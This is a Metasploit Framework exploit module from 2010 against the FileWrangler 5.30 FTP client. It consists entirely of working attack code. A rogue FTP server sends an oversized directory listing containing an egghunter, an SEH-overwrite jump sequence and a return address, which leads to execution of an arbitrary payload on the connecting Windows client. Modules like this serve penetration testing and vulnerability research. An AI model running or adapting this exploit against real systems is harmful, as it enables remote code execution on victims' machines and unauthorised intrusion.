##
# $Id: filewrangler_list_reply.rb 11039 2010-11-14 19:03:24Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::FtpServer
	include Msf::Exploit::Remote::Egghunter

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'FileWrangler 5.30 Stack Buffer Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow in the FileWrangler client
				that is triggered when the client connects to a FTP server and lists
				the directory contents, containing an overly long directory name.
			},
			'Author' 	 =>
				[
					'nullthreat',	# found bug
					'corelanc0d3r'	# wrote the exploit
				],
			'License'        => MSF_LICENSE,
			'Version'        => "$Revision: 11039 $",
			'References'     =>
				[
					[ 'URL', 'http://www.corelan.be:8800/index.php/2010/10/12/death-of-an-ftp-client/' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'seh',
				},
			'Payload'        =>
				{
					'Space'    => 3000,
					'BadChars' => "\x00\x0d\x1a\x2a\x51",
					'StackAdjustment' => -5000,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows Universal', { 'Offset' => 4082, 'Ret' => 0x0042BE63 } ], #ppr [wrangler.exe]
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Oct 12 2010',
			'DefaultTarget'  => 0))

	end


	def setup
		super
	end

	def on_client_unknown_command(c,cmd,arg)
		c.put("200 OK\r\n")
	end

	def on_client_command_list(c,arg)
		conn = establish_data_connection(c)
		if(not conn)
			c.put("425 Can't build data connection\r\n")
			return
		end
		print_status(" - Data connection set up")
		code = 150
		c.put("#{code} Here comes the directory listing.\r\n")
		code = 226
		c.put("#{code} Directory send ok.\r\n")

		# create the egg hunter
		print_status(" - Creating the Egg Hunter")
		badchars = ""
		eggoptions =
		{
		:checksum => true,
		:eggtag => "W00T"
		}

		hunter,egg = generate_egghunter(payload.encoded,badchars,eggoptions)

		# create hunter
		predator = "\x90" * 42
		predator << hunter

		# create the crash payload
		crash = rand_text_alpha(target['Offset'] - (egg.length + predator.length))

		# Set nseh to jump back 50 (before egghunter)
		jmp = "\x90" * 5 + "\xE9\xC9\xFF\xFF\xFF"
		nseh = "\xEB\xF9\x90\x90" # NSEH
		seh = [target.ret].pack('V')

		print_status(" - Building the Buffer")
		buffer = crash + egg + predator + jmp + nseh + seh
		strfolder = buffer + "B" * (5000-buffer.length)   #make sure it dies

		print_status(" - Sending directory list via data connection")
		dirlist ="drwxrwxrwx    1 100      0           11111 Jun 11 21:10 #{strfolder}\r\n"
		conn.put(dirlist)
		conn.close
		print_status(" - Waiting for egghunter...")
		return

	end

end
